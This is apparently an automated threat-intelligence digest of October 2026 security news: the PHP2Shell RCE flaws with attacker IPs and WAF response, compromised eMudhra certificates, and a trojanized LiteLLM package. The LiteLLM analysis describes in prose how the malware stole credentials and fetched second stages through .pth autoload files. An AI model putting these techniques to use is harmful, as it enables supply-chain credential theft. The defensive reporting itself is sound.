- cve_ids: CVE-2026-115560, CVE-2026-109618, CVE-2026-109619
- urgency_signals: actively_exploited, no_patch_yet, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Amazon's Threat Intelligence team on Wednesday said it detected an attempt to exploit the newly disclosed PHP2Shell vulnerabilities dating back to October 17, 2026, against its MadPot honeypot service, as the flaws come under broad exploitation in the wild following the release of the patches. "The exploit attempt originated from an IP address associated with a commercial anonymization network,
```

#### Full body

```
Someone Tried to Exploit PHP2Shell 4 Days Before the Vulnerabilities Were Publicly Disclosed  Ravie Lakshmanan  Oct 22, 2026 Vulnerability / Threat Intelligence Amazon's Threat Intelligence team on Wednesday said it detected an attempt to exploit the newly disclosed PHP2Shell vulnerabilities dating back to October 17, 2026, against its MadPot honeypot service, as the flaws come under broad exploitation in the wild following the release of the patches. "The exploit attempt originated from an IP address associated with a commercial anonymization network," CJ Moses, CISO of Amazon Integrated Security, said in a post shared with The Hacker News. "While the vulnerability was under embargo, the targeting of a honeypot from an anonymized IP address suggests the activity was conducted by a threat actor, though it remains unclear how the actor acquired exploit information prior to disclosure." The attempt, Amazon said, was recorded from " 103.216.220[.]92 ," an IP address geolocated to Australia. An Amazon spokesperson told The Hacker News that the activity was largely a one-off probe. ⚡ WARNING — PHP Warns of Another Unpatched RCE Flaw CVE-2026-115560 The activity relates to a set of two vulnerabilities impacting PHP core, both rated 9.2 on the CVSS scoring system. Tracked as CVE-2026-109618 and CVE-2026-109619 and discovered by researchers from Calif , OpenAI , and Google-owned Wiz , the flaws can be abused to achieve pre-authentication remote code execution on affected systems. The shortcomings are present in every PHP release from the 7.x and 8.x series, and pose a risk to every reachable PHP endpoint on an affected server, including static forms, login routes, and health checks. According to CrowdStrike, an attack exploiting the flaws leaves virtually no digital traces. "There is no authentication to bypass, no session to steal, and no vulnerable endpoint to discover," CrowdStrike said . "The exposure is independent of the CMS, framework, or plug-ins in use." "Worker processes remain stable, responses return HTTP 200, and application logs record no anomalies, because no application code ever ran. The only server-side trace is a single memory-limit fatal in the web server's error log, which is routinely dismissed as noise, leaving defenders without actionable web telemetry to identify compromised endpoints." Originally scheduled for coordinated disclosure on October 22, 2026, at 2:00 p.m. UTC, details about the CVE identifiers and a proof-of-concept (PoC) exploit leaked ahead of time , prompting the PHP Foundation to move the release forward by one day. "Both issues sit in parts of PHP that nearly every request touches: memory management and error handling," the PHP Foundation said . "Their central place in PHP is what made both vulnerabilities serious, and also so hard to fix without breaking compatibility, hurting performance, or forcing changes on the large ecosystem of third-party extensions." Amazon said it detected multiple PoC exploits for PHP2Shell coinciding with the day of the release of the fixes, with the earliest attempt flagged around October 21, 2026, at 2 a.m. UTC. This was followed by additional exploitation attempts from anonymized infrastructure over the next six hours. The variety of payloads and the anonymization infrastructure used indicate that multiple threat actors are involved, Amazon Threat Intelligence said. The attempts have been recorded from the following IP addresses on October 21, 2026 - 31.223.184[.]166 37.19.200[.]5 134.209.159[.]64 103.114.163[.]188 95.217.98[.]37 According to ELLIO , the first PHP2Shell request targeting its sensors was observed on October 21, 2026, at 8:36 a.m. UTC, less than an hour after "Chainguard unilaterally broke the embargo and published built images containing the fix." "Chainguard had received the patch in advance so its users could update the moment the vulnerabilities were disclosed," the PHP Foundation said. "Any attacker could now study the fix in binary form wh
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Someone Tried to Exploit PHP2Shell 4 Days Before the Vulnerabilities Were Publicly Disclosed
  - Published: 2026-10-22T06:34:10+00:00
  - Link: https://thehackernews.com/2026/10/someone-tried-to-exploit-php2shell-4.html
  - Summary: Amazon's Threat Intelligence team on Wednesday said it detected an attempt to exploit the newly disclosed PHP2Shell vulnerabilities dating back to October 17, 2026, against its MadPot honeypot service, as the flaws come under broad exploitation in the wild following the release of the patches. "The exploit attempt originated from an IP address associated with a commercial anonymization network,

### Cluster ce10cb1b5c — score 12

- Title: Imperia CMS SiteActive TEMPLATE Unauthenticated SSTI Remote Code Execution (CVE-2026-110355)
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-10-23T14:37:35+00:00
- Link: https://www.reddit.com/r/netsec/comments/1xdfues/imperia_cms_siteactive_template_unauthenticated/
- Fetch status: fetch_failed:HTTPError
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-110355

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-110355
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- cve_ids: CVE-2026-110355
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Summary

```
submitted by /u/MrTuxracer [link] [comments]
```

#### Corroborating sources (1)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: Imperia CMS SiteActive TEMPLATE Unauthenticated SSTI Remote Code Execution (CVE-2026-110355)
  - Published: 2026-10-23T14:37:35+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1xdfues/imperia_cms_siteactive_template_unauthenticated/
  - Summary: submitted by /u/MrTuxracer [link] [comments]

### Cluster 9ccfc452c8 — score 11

- Title: PHP2Shell Exposure Depends on More Than Whether You Use PHP
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-10-22T19:00:56+00:00
- Link: https://horizon3.ai/attack-research/attack-blogs/php2shell-exposure-exploitability/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-109618, CVE-2026-109619
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- cve_ids: CVE-2026-109618, CVE-2026-109619
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
PHP2Shell exposure can extend into bundled runtimes, containers, and hosted applications. Learn why identifying affected PHP is only the first step toward validating exploitability.
```

#### Full body

```
PHP2Shell Exposure Depends on More Than Whether You Use PHP Horizon3 October 22, 2026 Attack Blogs Disclaimer: This article is not a primer on how the CVEs (CVE-2026-109618/CVE-2026-109619) work. For that, see our PHP2Shell technical advisory . “We don’t use PHP” may describe your development stack, but it doesn’t directly describe every product, container, or hosted application your organization depends on. There are two important challenges when confirming the exploitability of PHP2Shell. The first challenge is finding the affected runtime—including the copies another team or provider manages. The second is understanding whether an attacker can exploit it in that particular environment. The PHP you didn’t choose An organization doesn’t need to write PHP applications to depend on PHP. A third-party application may bundle its own runtime. A container may carry a different version from its host. A hosting provider may manage PHP beneath a site whose administrators only see the content-management interface. These are sources to investigate, not evidence that every such product is affected. Establishing the actual exposure means identifying the actual runtime and checking the applicable vendor guidance. From a red-team perspective, the important question is which reachable systems depend on affected PHP, not which programming languages appear in the organization’s development standards. That also changes who can fix the problem. Updating the PHP package on a server does not establish that a bundled copy inside a product or container has also changed. Hosted applications change the responsibility With a fully managed website, the customer may have neither visibility into the PHP runtime nor permission to patch it. With self-managed hosting, that responsibility may sit with the customer. For a managed service, ask the provider: Does our service use an affected PHP runtime? Has a release containing both fixes—or an applicable vendor backport—been deployed? Have the relevant services and workers been restarted? Does that confirmation cover our service and all relevant instances? A statement that a provider offers patched PHP is less useful than confirmation that the patched runtime is serving your application. Presence is only the beginning of exploitability analysis Finding affected PHP establishes a remediation need. It does not, by itself, prove that a particular exploit will succeed. PHP2Shell covers two related memory-handling failure patterns. The server integration, application behavior, configuration, and request lifecycle can influence which paths are reachable. For the stale-state vulnerability, the demonstrated mechanism involves the state surviving one request and being used by a later request handled by the same worker. That is why a working exploit against one environment does not automatically establish identical results everywhere. It is also why an unsuccessful attempt does not establish that an affected runtime is safe. The useful finding is specific: which path was tested, under which conditions, with what observable result? What our validation establishes We’ve validated that these vulnerabilities can be feasibly exploited in practice, but it requires specific preconditions. We’re still characterizing those conditions and what they mean for real-world exposure; we’ll share further technical detail when it’s ready. That is where our research stands. The conditions of our validated exploit should not be treated as an exhaustive description of every possible path covered by these vulnerabilities. As the work develops, we will distinguish what we have demonstrated from what remains under investigation. Successful research validation and readiness for production assessment are also separate milestones. Getting an exploit, or even a reliable check, to work establishes a capability, but making that testing suitable for customer environments requires understanding its operational effects, defining its coverage, and interp
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: PHP2Shell Exposure Depends on More Than Whether You Use PHP
  - Published: 2026-10-22T19:00:56+00:00
  - Link: https://horizon3.ai/attack-research/attack-blogs/php2shell-exposure-exploitability/
  - Summary: PHP2Shell exposure can extend into bundled runtimes, containers, and hosted applications. Learn why identifying affected PHP is only the first step toward validating exploitability.

### Cluster 21772a3458 — score 11

- Title: Cloudflare deploys protections against php2shell vulnerability
- Source: Cloudflare Security (cloud_identity_infrastructure)
- Published: 2026-10-21T13:56:45+00:00
- Link: https://blog.cloudflare.com/php-vulnerabilities-waf-protection/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ddos
- affected_products: OpenAI/ChatGPT, WordPress
- cve_ids: CVE-2026-109618, CVE-2026-109619, CVE-2026-115560
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: data_breach, ddos
- affected_products: OpenAI/ChatGPT, WordPress
- cve_ids: CVE-2026-115560, CVE-2026-109618, CVE-2026-109619
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
Cloudflare has deployed default web application firewall (WAF) protections for newly disclosed PHP vulnerabilities before public disclosure. The rules use request and response signals to stop exploit attempts and prevent exposed data from reaching attackers.
```

#### Full body

```
Update - On October 23, the PHP project published an informational advisory for a related vulnerability, CVE-2026-115560, in PHP's session upload progress feature. It affects fully patched PHP releases, including 8.5.12, and will be fixed in PHP's next regular release. All Cloudflare WAF customers are protected against known exploit attempts if their site uses PHP's default upload progress field name. Customers who have changed session.upload_progress.name are not covered by the WAF rule. The existing rules "PHP Remote Code Execution Attack (CVE-2026-109618, CVE-2026-109619) #6" protects against this vulnerability. More information to follow. October 21, Calif.io, Wiz, OpenAI and Quarkslab disclosed two Â vulnerabilitiesÂ in PHP, tracked as CVE-2026-109618 and CVE-2026-109619 and known as php2shell .Â The vulnerabilities affect all web servers running PHP 5.4 or later and they may allow an attacker to cause denial of service, remote code execution, and data exposure when an application processes specially crafted HTTP traffic. Cloudflare has been part of a coordinated effort to deploy mitigations to protect the Internet, working with PHP foundation , OpenAI Â and Wiz Â among others. Cloudflare has developed and deployed web application firewall (WAF) protections since early October 2026, which were deployed about 9 hours ahead of public disclosure. Starting on October 21 3:02 am UTC, Cloudflare customersÂ using our free or paid WAF were protected by default against php2shell. CloudflareÂ successfully deployed multiple mitigations for all its customersÂ while the vulnerability was leaked before the official release date and we observed attack traffic targeting our customers.Â We observed how attackers were mutating the attack payload to try to bypass our protections by tracking the volume of matches and cross-referencing with the rule logic. Protecting against php2shell required more than standard request-based rules. Request data alone does not always provide enough evidence to distinguish an exploit from legitimate traffic. The originâs response adds context, helping identify whether an exploit succeeded while reducing the risk of false positives. To deliver this protection, we developed full transaction detection, a new Cloudflare WAF capability that combines signals from the request and response within the same HTTP transaction. Response rules can then block a matching origin response before it reaches the requester. The php2shell protections are the first managed detections we have released using this capability. Customers should patch their PHP repos even with WAF protections providing an additional layer of defense-in-depth mitigation.Â Our security analysts continue monitoring attack activity and update the rules when and if new techniques and variations emerge in the hours and days ahead. You can track new rules in the changelog . The protections are available and deployed automatically on all plans with WAF deployed, including Free users. What we know about the vulnerabilities PHP is used by almost 70% of websites . The php2shell vulnerabilities affect the PHP runtime itself and can allow attackers to execute malicious code on vulnerable servers, expose customer data, or disrupt services. Because PHP underpins widely used platforms such as WordPress and Magento, these flaws could potentially affect a large number of applications across the Internet. The two vulnerabilities involve how PHP handles memory when something goes wrong while processing a HTTP request. Normally, PHP allocates memory to store the data it needs to process a request, then releases it when that work finishes. If processing stops unexpectedly, for example because it runs out of memory, PHP fails to clean up the memory safely. These vulnerabilities arise when PHP handles an error and then tries to use data that was not fully set up or memory that has already been released. An attacker can send specially crafted HTTP requests to trigger these cond
```

#### Corroborating sources (1)

- **Cloudflare Security** (cloud_identity_infrastructure)
  - Title: Cloudflare deploys protections against php2shell vulnerability
  - Published: 2026-10-21T13:56:45+00:00
  - Link: https://blog.cloudflare.com/php-vulnerabilities-waf-protection/
  - Summary: Cloudflare has deployed default web application firewall (WAF) protections for newly disclosed PHP vulnerabilities before public disclosure. The rules use request and response signals to stop exploit attempts and prevent exposed data from reaching attackers.

### Cluster 714ebb3d4d — score 11

- Title: 8 eMudhra certificates are compromised. Here's what you need to know
- Source: Cloudflare Security (cloud_identity_infrastructure)
- Published: 2026-10-20T22:20:16+00:00
- Link: https://blog.cloudflare.com/emudhra-certificate-compromise/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: incident_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: incident_report
- confidence_tier: tier_2_operator

#### Summary

```
Following the discovery that eight eMudhra intermediate certificates use weak keys, Cloudflare is deploying mitigations and releasing client updates. We explain the impact, our response, and what customers and developers should do next.
```

#### Full body

```
OnÂ October 19, 2026, at approximatelyÂ 17:00 UTC, Cloudflare became aware that private keys associated with eight eMudhra intermediate certificates were compromised. These certificates were widely trusted by browsers, operating systems, and also within Cloudflare. Because the keys themselves are weak, an attacker can create a forged certificate for any domain and use it to impersonate servers to intercept or modify traffic. This is a serious security incident with implications across the Internet. For reference, here is a link Â to more information about how SSL certificates work and why they are so critical to the operation of the Internet. We immediately prioritized patching critical services across Cloudflare to protect our customers ahead of the public disclosure of the vulnerability. Our security review has not identified active exploitation of this issue on Cloudflare services. We have released updates for the Cloudflare One Clients, also known as WARP or the 1.1.1.1 app, and Cloudflare Tunnel, also known as cloudflared. We have also deployed mitigations across our CDN, Developer, and Zero Trust products. If you are using Cloudflare Zero Trust with Gateway and an up-to-date client (see below), you are automatically protected. Our response We prioritized updating services that use public certificates to authenticate remote endpoints, including proxies connecting to origins and applications calling external APIs. In parallel, we updated shared trust stores, base images, and other shared foundations, providing a common mitigation path for services that inherit their certificate trust from those sources. We paired these updates with reloads, restarts, and image deployments needed to activate them. Applications with bundled or custom trust stores received separate assessment and updates. This work addresses certificate-based authentication, not a weakness in TLSâs encryption algorithms. Teams across Cloudflare are presently working on further remediation. We are making progress, but there's much work still to be done. Some customers will need to take action on software or trust configurations that they operate, especially on their origin servers. Â The recommended actions are summarized below. What customers should do Users of these software or services Action the customer should take Cloudflare One/WARP Cloudflare One Client: Upgrade to: v2.5.7 (Android), v1.12.7 (iOS), Windows Desktop (2026.8.2115.0) , macOS (2026.8.2115.0) , Linux (2026.8.2115.0) 1.1.1.1 app: Upgrade to: v6.38.11 (Android), v6.31.8 (iOS), Windows Desktop (2026.8.2115.0) , macOS (2026.8.2115.0) , Linux (2026.8.2115.0) Cloudflare Tunnel (cloudflared) Upgrade to 2026.10.2 . For container deployments, update and redeploy the fixed image Customer-configured TLS client authentication Review and update your mutual TLS trust store/uploaded CAs used to verify client certificates Customer Origin TLS Servers configuration Review your custom origin certificates and server configurations if using Full (strict) Â encryption mode or Strict Â mode. We are updating Automatic SSL/TLS Â to automatically notify you if you still use these distrusted certificates, which would cause breakages. Cloudflare Containers Customers using Cloudflare Containers, including Sandboxes, should review their container images and application dependencies for affected certificate trust stores and apply updates based on your deployed image. Customers can also enable HTTPS egress interception Â to route outbound HTTPS requests through Cloudflare, moving remote-server certificate validation from the application to Cloudflare-managed infrastructure. This allows Cloudflareâs trust-store mitigations to protect intercepted connections. Containers that have this enabled are already protected. Developer guidance For developers, look beneath the SDK. An API client may delegate certificate verification to an HTTP library, a language runtime, the operating system, or a custom trust configuration. Updat
```

#### Corroborating sources (1)

- **Cloudflare Security** (cloud_identity_infrastructure)
  - Title: 8 eMudhra certificates are compromised. Here's what you need to know
  - Published: 2026-10-20T22:20:16+00:00
  - Link: https://blog.cloudflare.com/emudhra-certificate-compromise/
  - Summary: Following the discovery that eight eMudhra intermediate certificates use weak keys, Cloudflare is deploying mitigations and releasing client updates. We explain the impact, our response, and what customers and developers should do next.

### Cluster 8cb026f4f0 — score 11

- Title: LiteLLM Compromised, Steals Credentials
- Source: Wiz Research (cloud_identity_infrastructure)
- Published: 2026-10-21T13:44:12+00:00
- Link: https://www.wiz.io/blog/litellm-compromised-steals-credentials
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_products: Docker, GitHub, PyPI
- content_type: incident_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- affected_products: Docker, GitHub, PyPI
- content_type: incident_report
- confidence_tier: tier_2_operator

#### Summary

```
In a new incident, a malicious version (1.107.0) of the LiteLLM package was uploaded to PyPI and Docker on October 21. The malicious version includes a credential stealer targeting browser, cloud and AI secrets as well as a dormant C2 capability.
```

#### Full body

```
LiteLLM Compromised At 11:39 UTC on October 21, a malicious version (1.107.0) of the LiteLLM package was uploaded to PyPI. This version was quarantined on PyPI as of 13:20 UTC. According to ClickPy data , the malicious version received approximately 49,000 downloads. LiteLLM Docker containers on GHCR and Docker hub also included the trojanized version of LiteLLM. These included the v1.107.0 , latest , main-latest and main-stable tags. These were removed ~13:53 UTC. The most recent safe version is v1.106.2. When the malicious package is installed, three files are extracted directly into the site-packages root: cook.pth , cook.py and sitecustomize.py . These packages are designed to be executed whenever a python interpreter is started. Per LiteLLM developer BerriAI : malicious actions were taken through three engineers' GitHub accounts, appearing to be by way of stolen GitHub CLI OAuth tokens. The threat actor used one user's account triggered the project-releaser run, and another user's account to approve it. All tokens which were involved in this attack have been revoked. And in a followup : GitHub CLI OAuth token exposure After a thorough investigation, we have observed specific situations in which Claude Code will embed a user’s GitHub CLI OAuth token into a response body, and in situations where response bodies are logged, these tokens may appear in LiteLLM logs. Access to our internal LiteLLM deployment We identified an unexpected, innocuously named user account in our internal LiteLLM deployment, which was exposed to the public internet. We believe the attacker gained access to this deployment, obtained the GitHub CLI OAuth tokens from its logs, and subsequently used those credentials to compromise our release workflow. We have not yet confirmed how the attacker gained access to our internal deployment, but currently suspect it was through a recently patched vulnerability. UPDATES 14:05 UTC - added IOC table 14:15 UTC - added Attack Commits details 14:40 UTC - added Credential Stealer details, noted Docker takedown 15:20 UTC - clarified dual-technique approach novelty and LLM-aided development 16:40 UTC - added diagram of payload flow 16:55 UTC - added LiteLLM statement on root cause 18:35 UTC - LiteLLM has released a blog post 19:05 UTC - added observed post-exploitation activity 21:45 UTC - updated LiteLLM details on root cause October 22 12:55 UTC - added PyPi download stats Payload Diagram of payload flow The payload has strong indications of LLM-aided development, including verbose variable names (encrypted_private_key_output ), overly defensive error handling with generic try/except blocks, platform-specific code paths that fail silently on untested platforms (Windows marker path /tmp/ doesn't exist, fcntl/fork calls crash the remote loader), and a dead code module ( exec_py ) that was defined but never called. The structure suggests iterative prompting: functional on the happy path but brittle at the edges and untested. Upon startup, the interpreter processes cook.pth , which includes a command to import cook , which loads cook.py . cook.py deobfuscates itself, runs a stealer routine and writes a maker to /tmp/.pc_once_72129118c59f5636c0bb (note this fails on Windows, as the /tmp/ path often does not exist). The stealer routine gathers system, browser, developer, cloud and AI tool secrets, encrypts them and exfiltrates to www.litellm.dev/healthcheck via a post request. This domain is attacker controlled, impersonating LiteLLM infrastructure. Python interpreters will also attempt to execute sitecustomize.py - however, it will only run on Linux & MacOS machines. This script attempts to fetch domain.txt from a GitHub dead drop ( letters9813/pythonclient-test/main/domain.txt) . If it receives a response, it will attempt to download a second stage python script from http://<domain>/codepy and run it. As of the time of analysis, the domain.txt file was never populated beyond initial test values. The repo has been taken d
```

#### Corroborating sources (1)

- **Wiz Research** (cloud_identity_infrastructure)
  - Title: LiteLLM Compromised, Steals Credentials
  - Published: 2026-10-21T13:44:12+00:00
  - Link: https://www.wiz.io/blog/litellm-compromised-steals-credentials
  - Summary: In a new incident, a malicious version (1.107.0) of the LiteLLM package was uploaded to PyPI and Docker on October 21. The malicious version includes a credential stealer targeting browser, cloud and AI secrets as well as a dormant C2 capability.

### Cluster b4dcc058dd — score 11

- Title: Who Checked It? Attestations, Gemara, and CRA Due Diligence
- Source: OpenSSF Blog (ai_security_agentic_risk)
- Published: 2026-10-22T12:10:04+00:00
- Link: https://openssf.org/blog/2026/10/22/who-checked-it-attestations-gemara-and-cra-due-diligence/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- affected_industries: legal_professional
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain
- affected_industries: legal_professional
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Discover how the OpenSSF Gemara project clarifies the complex world of security attestations, streamlines software supply chain evaluations, and helps organizations confidently meet EU Cyber Resilience Act (CRA) due diligence requirements.
```

#### Full body

```
By Eddie Knight Introduction There are several places in security and compliance where we have semantic overload that causes undue complexity. One case that comes to mind up front is the word “policy,” which can describe the ruleset configuration for a security tool, or it could describe the rules that an organization sets for itself. Another overloaded term is “control,” which could be a statement or a set of information describing a security objective, or it could be a process that was implemented to achieve an objective. Beyond the semantic overload that makes it unnecessarily difficult to work in the security and compliance space, we also have terms that have clear definitions. These terms, however, can have a wide variety of possible implementations. So while we’re not experiencing semantic overload, we are running into functional overload. That’s the type of scenario that we’re dealing with when we look at attestations. It can sometimes feel like people are crossing wires when they talk about attestations, because sometimes it’s one thing and sometimes it’s another thing, and we might find ourselves wishing that people would just decide what they mean when they say attestation… But really, this isn’t an undue complexity. This is a natural complexity that arises from the massive breadth of the ecosystem we’re trying to secure. The OpenSSF’s Gemara project seeks to address both of these complexities. The undue complexity of overloaded terms, Gemara tackles by locking down definitions and taking an opinionated stance. Gemara can also help us with the natural complexity by helping us understand the space in which each thing operates. So when we have something like an attestation that belongs in a variety of places, we can shift from asking “What is an attestation?” to “What is an attestation in this particular circumstance?” Level Set Now that I’ve used four paragraphs in a long introduction, it would serve us to rewind just a bit and establish a conversational baseline. Attestations have always been an important part of life, even before we had a word for them. An attestation is a claim about something by someone. It’s a statement that is made by one party to another. It’s a fairly simple concept. What comes downstream from it is the complexity. When do we need to make claims, and how? I often need to make a claim about who I am. So I can do it verbally. I can also do it by showing identification. These are both attestations: I’m attesting to who I am. When I do it verbally, it carries less legal weight than if I do it with a photo ID. But that carries even less weight than if I do it with a photo ID that you can validate against some database of sorts. So as technology grows and enters into a particular space, our attestations can become more verifiable, more robust. I might also attest to my relationship status. When I tell you that I’m married, that is an attestation. When I show you a marriage certificate, that is an attestation. When you look up that marriage certificate in a database and find that it was properly filed and was signed with witnesses, that attestation carries significantly more evidence along with it, and you’re going to treat that attestation much differently if this claim is important to you. But on the flip side, that claim may be trivial to you, so those validations aren’t something that you need to pursue. And a more complex attestation becomes unnecessary weight. It’s not creating any value for you because you didn’t need to have all of these verifications. It may be that you have already done the verification yourself. It may be that you have already established a line of trust with me to where you don’t need to validate my word, or it may be that you just don’t actually care whether or not I’m married. And this is where our digital attestations for software and security and supply chain decisions can become very, very complex. We are able to introduce extremely detailed, high-fidelity claims, bu
```

#### Corroborating sources (1)

- **OpenSSF Blog** (ai_security_agentic_risk)
  - Title: Who Checked It? Attestations, Gemara, and CRA Due Diligence
  - Published: 2026-10-22T12:10:04+00:00
  - Link: https://openssf.org/blog/2026/10/22/who-checked-it-attestations-gemara-and-cra-due-diligence/
  - Summary: Discover how the OpenSSF Gemara project clarifies the complex world of security attestations, streamlines software supply chain evaluations, and helps organizations confidently meet EU Cyber Resilience Act (CRA) due diligence requirements.

### Cluster 42fec6ef81 — score 11

- Title: Today's PHP Security Release, and How We're Strengthening PHP Security
- Source: Simon Willison (ai_security_agentic_risk)
- Published: 2026-10-21T18:41:53+00:00
- Link: https://simonwillison.net/2026/Oct/21/php-security-release/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_products: Drupal, Google/Gemini, WordPress
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- affected_products: Google/Gemini, Drupal, WordPress
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Today's PHP Security Release, and How We're Strengthening PHP Security If you're running anything on PHP it's vital you upgrade - today's updates (across the entire PHP 8.x line) address two remote code execution holes, and there have been exploits circulating since last night, thanks to a leak in the coordinated disclosure process. This post from the PHP Foundation explain what went so wrong: On Tuesday, October 20th, at around 15:00 UTC, the two CVE IDs began circulating on online forums and social media. They came with a wrong release time and a wrong CVSS score of 10.0 (the actual score is 9.2). No technical details leaked. In response, the PHP project brought its pre-announcement forward and published it at 19:30 UTC . It also moved the release from October 22nd, 14:00 UTC, to October 21st, 14:00 UTC [...] As a result of the leak and pre-announcement around 20:00 UTC, Calif, one of the security firms that had reported the issues mistakenly published a video. It showed their proof
```

#### Full body

```
Simon Willison’s Weblog Newsletter Sponsored by: Teleport — AI agents (and sub-agents they spawn) are given the same access as humans, but they never sleep. Learn how to monitor and constrain their behavior with isolated ephemeral trusted runtimes. 21st October 2026 - Link Blog Today's PHP Security Release, and How We're Strengthening PHP Security ( via ) If you're running anything on PHP it's vital you upgrade - today's updates (across the entire PHP 8.x line) address two remote code execution holes, and there have been exploits circulating since last night, thanks to a leak in the coordinated disclosure process. This post from the PHP Foundation explain what went so wrong: On Tuesday, October 20th, at around 15:00 UTC, the two CVE IDs began circulating on online forums and social media. They came with a wrong release time and a wrong CVSS score of 10.0 (the actual score is 9.2). No technical details leaked. In response, the PHP project brought its pre-announcement forward and published it at 19:30 UTC . It also moved the release from October 22nd, 14:00 UTC, to October 21st, 14:00 UTC [...] As a result of the leak and pre-announcement around 20:00 UTC, Calif, one of the security firms that had reported the issues mistakenly published a video. It showed their proof of concept working against a number of targets and revealed a few additional, though limited, details about the vulnerabilities. Copies of the deleted video started circulating on social media soon after. The video contributed to accelerated development of various PoCs (exploitation proof of concepts), which then increased circulation on October 21st. This article from the team that discovered the original vulnerability includes a more detailed timeline of the original intended responsible disclosure: August 19, 2026: Wiz Research discovers the first PHP vulnerability using Wiz Atlas, Gemini 4 Argon, and GPT-5.6 Sol. August 20, 2026: Unauthenticated RCE is confirmed against Drupal. August 21, 2026: Unauthenticated RCE is confirmed against WordPress. August 24, 2026: Wiz Research reports the vulnerabilities to the PHP security team. September 21, 2026: PHP acknowledges the reports and begins developing a coordinated fix. October 21, 2026: Patched PHP releases become available. October 21, 2026: Public disclosure. Posted 21st October 2026 at 6:41 pm Recent articles Battle Drones - a vibe coded RTS with audio-based multiplayer - 20th October 2026 Hello Python 3.15, goodbye 3.10, and now I can use 3.11 - 12th October 2026 A new feature for my blog, built using my voice - 9th October 2026 Claude Haiku 5.5 - 7th October 2026 This is a link post by Simon Willison, posted on 21st October 2026 . open-source 324 php 191 security 641 ai 2,292 ai-security-research 50 Monthly briefing Sponsor me for $10/month and get a curated email digest of the month's most important LLM developments. Pay me to send you less! Sponsor & subscribe Disclosures Colophon © 2002 2003 2004 2005 2006 2007 2008 2009 2010 2011 2012 2013 2014 2015 2016 2017 2018 2019 2020 2021 2022 2023 2024 2025 2026
```

#### Corroborating sources (1)

- **Simon Willison** (ai_security_agentic_risk)
  - Title: Today's PHP Security Release, and How We're Strengthening PHP Security
  - Published: 2026-10-21T18:41:53+00:00
  - Link: https://simonwillison.net/2026/Oct/21/php-security-release/
  - Summary: Today's PHP Security Release, and How We're Strengthening PHP Security If you're running anything on PHP it's vital you upgrade - today's updates (across the entire PHP 8.x line) address two remote code execution holes, and there have been exploits circulating since last night, thanks to a leak in the coordinated disclosure process. This post from the PHP Foundation explain what went so wrong: On Tuesday, October 20th, at around 15:00 UTC, the two CVE IDs began circulating on online forums and social media. They came with a wrong release time and a wrong CVSS score of 10.0 (the actual score is 9.2). No technical details leaked. In response, the PHP project brought its pre-announcement forward and published it at 19:30 UTC . It also moved the release from October 22nd, 14:00 UTC, to October 21st, 14:00 UTC [...] As a result of the leak and pre-announcement around 20:00 UTC, Calif, one of the security firms that had reported the issues mistakenly published a video. It showed their proof

### Cluster fb556ca51b — score 11

- Title: Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-10-22T20:14:27+00:00
- Link: https://www.team-cymru.com/post/cl0p-ransomware-mft-attack-pattern-threat-intelligence
- Fetch status: ok
- Member count: 2
- Corroborating source count: 1
- Strong signals: Cl0p

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion, zero_day
- actor_attribution: Cl0p
- affected_products: SolarWinds
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day
- actor_attribution: Cl0p
- affected_products: SolarWinds
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Analyze Cl0p ransomware's history of targeting MFT systems. Discover their attack pattern in threat intelligence to improve cyber attack surface reduction.
```

#### Full body

```
